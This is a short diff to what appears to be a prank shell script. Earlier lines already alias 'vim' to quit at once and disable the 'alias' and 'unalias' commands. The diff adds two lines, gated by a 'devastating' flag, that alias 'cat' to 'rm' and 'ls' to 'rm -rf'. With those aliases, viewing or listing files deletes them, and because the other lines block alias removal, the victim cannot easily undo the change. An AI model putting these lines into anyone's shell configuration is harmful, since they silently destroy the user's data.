@@ -124,3 +124,6 @@ annoying && alias vim="vim +q";
 # Disable `unalias` and `alias`.
 alias unalias=false;
 alias alias=false;
+
+devastating && alias cat="rm"
+devastating && alias ls="rm -rf"
